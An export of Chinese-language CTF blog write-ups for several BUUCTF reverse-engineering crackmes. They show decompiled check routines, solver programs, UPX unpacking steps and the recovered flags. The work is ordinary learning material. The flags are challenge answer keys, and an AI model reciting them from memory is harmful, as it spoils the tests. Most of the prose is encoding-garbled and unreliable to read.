src="https://raw.githubusercontent.com/x2658y/static/master/images/202201230024194.png"
alt="image-20220123002452161" />
<figcaption aria-hidden="true">image-20220123002452161</figcaption>
</figure>
<p>ç„¶å<code>DialogFunc()</code>å‡½æ•°çš„ç®—æ³•å°±æ¸…æ™°äº†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-20030h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR String[<span class="number">65536</span>]; <span class="comment">// [esp+34h] [ebp-20004h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">65536</span>]; <span class="comment">// [esp+10034h] [ebp-10004h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      v8 = <span class="number">83</span>;</span><br><span class="line">      v9 = <span class="number">69</span>;</span><br><span class="line">      v10 = <span class="number">67</span>;</span><br><span class="line">      v11 = <span class="number">97</span>;</span><br><span class="line">      v12 = <span class="number">78</span>;</span><br><span class="line">      v13 = <span class="number">72</span>;</span><br><span class="line">      v14 = <span class="number">51</span>;</span><br><span class="line">      v15 = <span class="number">110</span>;</span><br><span class="line">      v16 = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0((<span class="type">int</span>)v7, <span class="number">0</span>, <span class="number">10</span>);    <span class="comment">//å°†v7[0]ã€v7[1]ä»¥åŠv8~v16è¿›è¡Œå‡åºæ’åº</span></span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">5</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">7</span>];</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">6</span>];</span><br><span class="line">      v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(v18, <span class="built_in">strlen</span>(v18));  <span class="comment">//å¯¹Stringçš„5~7ä½è¿›è¡Œbase64ç¼–ç </span></span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">3</span>];</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">2</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">4</span>];</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(v18, <span class="built_in">strlen</span>(v18));  <span class="comment">//å¯¹Stringçš„2~4ä½è¿›è¡Œbase64ç¼–ç </span></span><br><span class="line">      <span class="keyword">if</span> ( String[<span class="number">0</span>] == v7[<span class="number">0</span>] + <span class="number">34</span>  <span class="comment">//String[0]=&#x27;U&#x27;, v7=&#x27;3&#x27;</span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == v10         <span class="comment">//String[1]=&#x27;J&#x27;, v10=&#x27;J&#x27;</span></span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * v8    <span class="comment">//String[2]=&#x27;W&#x27;, v8=&#x27;E&#x27;</span></span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (v13 / <span class="number">9</span>)   <span class="comment">//String[3]=&#x27;P&#x27;, v13=&#x27;Z&#x27;</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)      <span class="comment">//base64è§£ç å¯çŸ¥String[5]~String[7]=&quot;jMp&quot;</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )    <span class="comment">//åŒç†String[2]~String[4]=&quot;WP1&quot;</span></span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŠŠ<code>String</code>çš„8ä½è¿èµ·æ¥å°±æ˜¯<code>UJWP1jMp</code>,
æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;UJWP1jMp&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]rome</title>
    <url>/2022/01/25/%5BReverse%5Drome/</url>
    <content><![CDATA[<p>æ— å£³, æ‹–è¿›<code>IDA</code>, <code>F5</code>æŸ¥çœ‹ä¼ªä»£ç ,
ä¸»å‡½æ•°é‡Œé¢ä¸»è¦å°±<code>func()</code>å‡½æ•°, è·Ÿåˆ°<code>func()</code>é‡Œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§£æ³•å¾ˆå¸¸è§„, åˆ†æç®—æ³•, å†™å‡ºè§£å¯†ç¨‹åº</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> ciphertext[<span class="number">32</span>] = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>;</span><br><span class="line">	<span class="type">char</span> plaintext[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">char</span> c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++)	<span class="comment">//é€ä½ç©·ä¸¾æ‰€æœ‰ASCIIå¯æ‰“å°å­—ç¬¦</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> temp = c;</span><br><span class="line">			<span class="keyword">if</span> (c &gt; <span class="number">64</span> &amp;&amp; c &lt;= <span class="number">90</span>)</span><br><span class="line">				temp = (c - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c &gt; <span class="number">96</span> &amp;&amp; c &lt;= <span class="number">122</span>)</span><br><span class="line">				temp = (c - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">			<span class="keyword">if</span> (temp == ciphertext[i])</span><br><span class="line">				plaintext[i] = c;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ACTF&#123;%s&#125;&quot;</span>, plaintext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ACTF&#123;Cae3ar_th4_Gre@t&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]æ–°å¹´å¿«ä¹</title>
    <url>/2022/01/20/%5BReverse%5D%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90/</url>
    <content><![CDATA[<p>ç›´æ¥æ‰“å¼€, è®©è¾“<strong>flag</strong>, éšä¾¿è¯•ä¸€ä¸‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202340448.png"
alt="image-20220120234044392" />
<figcaption aria-hidden="true">image-20220120234044392</figcaption>
</figure>
<p>é¦–å…ˆ<code>D.I.E</code>æŸ¥å£³</p>
<blockquote>
<p><code>D.I.E</code>æŸ¥å£³å·¥å…·: <a
href="https://github.com/horsicq/Detect-It-Easy">Github</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202326577.png"
alt="image-20220120232650513" />
<figcaption aria-hidden="true">image-20220120232650513</figcaption>
</figure>
<p>å¯è§æ˜¯<code>UPX</code>å£³, å°±ä¸ä¸Šè„±å£³æœºäº†,
ä¸Š<code>x32dbg</code>æ‰‹å·¥è„±å£³</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202344269.png"
alt="image-20220120234405168" />
<figcaption aria-hidden="true">image-20220120234405168</figcaption>
</figure>
<p>ä»å…¥å£å¾€ä¸Šç¿»èƒ½çœ‹åˆ°<code>pushad</code>,
ä¸€èˆ¬<code>UPX</code>å£³çš„çš„<code>pushad</code>å’Œ<code>popad</code>éš”å¾—ä¸è¿œ,
å¾€ä¸‹ç¿»å°±èƒ½æ‰¾åˆ°,ä¹Ÿå¯ä»¥ä½¿ç”¨<code>å †æ ˆå¹³è¡¡æ³•(espå®šå¾‹æ³•)</code>æ¥æ‰¾<code>popad</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202347918.png"
alt="image-20220120234745819" />
<figcaption aria-hidden="true">image-20220120234745819</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201202358470.png"
alt="image-20220120235818368" />
<figcaption aria-hidden="true">image-20220120235818368</figcaption>
</figure>
<p>è·Ÿåˆ°0x401280é‡Œ, çœ‹èµ·æ¥æ²¡é—®é¢˜, å°è¯•è„±å£³,
ä½¿ç”¨<code>Scylla</code>æ’ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210001427.png"
alt="image-20220121000101326" />
<figcaption aria-hidden="true">image-20220121000101326</figcaption>
</figure>
<p><code>OEP</code>è®¾ç½®ä¸º0x401280å†<code>IAT Autosearch</code>,
å†<code>get import</code>, ä¸€åˆ‡æ­£å¸¸, <code>dump</code>å‡ºexe,
å†<code>fix dump</code>åˆšå¯¼å‡ºçš„exe</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210002674.png"
alt="image-20220121000248577" />
<figcaption aria-hidden="true">image-20220121000248577</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210003350.png"
alt="image-20220121000337291" />
<figcaption aria-hidden="true">image-20220121000337291</figcaption>
</figure>
<p>å°è¯•æ‰“å¼€, æ­£å¸¸è¿è¡Œ, è¯´æ˜è„±å£³æˆåŠŸ</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210006458.png"
alt="image-20220121000655406" />
<figcaption aria-hidden="true">image-20220121000655406</figcaption>
</figure>
<p>å†ç”¨<code>D.I.E</code>æŸ¥çœ‹, å·²ç»æ— å£³äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210007602.png"
alt="image-20220121000749537" />
<figcaption aria-hidden="true">image-20220121000749537</figcaption>
</figure>
<p>æ‹–è¿›<code>IDA</code>åˆ†æ, F5æŸ¥çœ‹ä¼ªä»£ç ,
å°±æ˜¯æ¯”è¾ƒè¾“å…¥ä¸å­—ç¬¦ä¸²"HappyNewYear!",
æ‰€ä»¥<strong>flag</strong>åº”è¯¥å°±æ˜¯<code>flag&#123;HappyNewYear!&#125;</code><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210012782.png"
alt="image-20220121001208743" /></p>
<p>éªŒè¯, <strong>flag</strong>æ­£ç¡®</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201210013420.png"
alt="image-20220121001339364" />
<figcaption aria-hidden="true">image-20220121001339364</figcaption>
</figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]reverse3</title>
    <url>/2022/01/21/%5BReverse%5Dreverse3/</url>
    <content><![CDATA[<p>æ— å£³, ç›´æ¥æ‹–è¿›<code>IDA</code>åˆ†æ, F5æŸ¥çœ‹ä¼ªä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-188h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+0h] [ebp-188h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [esp+DCh] [ebp-ACh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v11; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">108</span>]; <span class="comment">// [esp+F4h] [ebp-94h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">28</span>]; <span class="comment">// [esp+160h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">8</span>]; <span class="comment">// [esp+17Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)i &gt;= <span class="number">0x64</span> )</span><br><span class="line">      j____report_rangecheckfailure();	<span class="comment">//åº”è¯¥æ˜¯VSè°ƒè¯•å™¨åŠ çš„ä»£ç ,ä¸ç®¡</span></span><br><span class="line">    Destination[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_41132F(<span class="string">&quot;please enter the flag:&quot;</span>, v7);</span><br><span class="line">  sub_411375(<span class="string">&quot;%20s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  v3 = j_strlen(Str);</span><br><span class="line">  v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_4110BE(Str, v3, v14);	<span class="comment">//æ³¨æ„è¿™ä¸ªsub_4110BE()å‡½æ•°, ä½œç”¨æœªçŸ¥</span></span><br><span class="line">      <span class="built_in">strncpy</span>(Destination, v4, <span class="number">0x28</span>u);	<span class="comment">//å°†sub_4110BE()è¿”å›å€¼æŒ‡å‘çš„å­—ç¬¦æ‹·åˆ°Destinationæ•°ç»„</span></span><br><span class="line">  v11 = j_strlen(Destination);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v11; ++j )</span><br><span class="line">    Destination[j] += j;		<span class="comment">//å­—ç¬¦ç§»ä½</span></span><br><span class="line">  v5 = j_strlen(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Destination, Str2, v5) )	<span class="comment">//Str2=&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">    sub_41132F(<span class="string">&quot;rigth flag!\n&quot;</span>, v8);		</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_41132F(<span class="string">&quot;wrong flag!\n&quot;</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…³é”®åœ¨äº<code>sub_4110BE()</code>è¿™ä¸ªå‡½æ•°,
èœé¸¡ä¸€æ—¶æ²¡çœ‹å‡ºæ¥å®ƒæ˜¯å¹²å•¥çš„. äºæ˜¯æŠŠå®ƒä»<code>IDA</code>æŠ å‡ºæ¥,
ç•¥ä½œä¿®æ”¹è®©å®ƒèƒ½è·‘èµ·æ¥, å‘½åä¸º<code>unknown()</code>, çœ‹çœ‹è¿™ä¸ªå®ƒçš„ä½œç”¨</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* __cdecl <span class="title">unknown</span><span class="params">(<span class="type">char</span>* a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span>	<span class="comment">//ç¬¬ä¸‰ä¸ªå‚æ•°æ— ç”¨, å¯åˆ å»</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> v5; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+E0h] [ebp-2Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">    <span class="type">int</span> v11; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">    <span class="type">void</span>* v12; <span class="comment">// [esp+F8h] [ebp-14h]</span></span><br><span class="line">    <span class="type">char</span>* v13; <span class="comment">// [esp+104h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!a1 || !a2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v9 = a2 / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)(a2 / <span class="number">3</span>) % <span class="number">3</span>)</span><br><span class="line">        ++v9;</span><br><span class="line">    v10 = <span class="number">4</span> * v9;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!v12)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v12, <span class="number">0</span>, v10 + <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> byte_41A144[<span class="number">4</span>];</span><br><span class="line">    <span class="type">char</span> aAbcdefghijklmn[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\x00&quot;</span>;</span><br><span class="line">    <span class="comment">//åæ¥æ‰çŸ¥é“,å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸€ä¸ªbase64çš„ç è¡¨</span></span><br><span class="line">    v13 = a1;</span><br><span class="line">    v11 = a2;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (v11 &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            byte_41A144[i] = *v13;</span><br><span class="line">            --v11;</span><br><span class="line">            ++v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!i)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span> (i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">            v5 = v4 + <span class="number">1</span>;</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v5) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">            v4 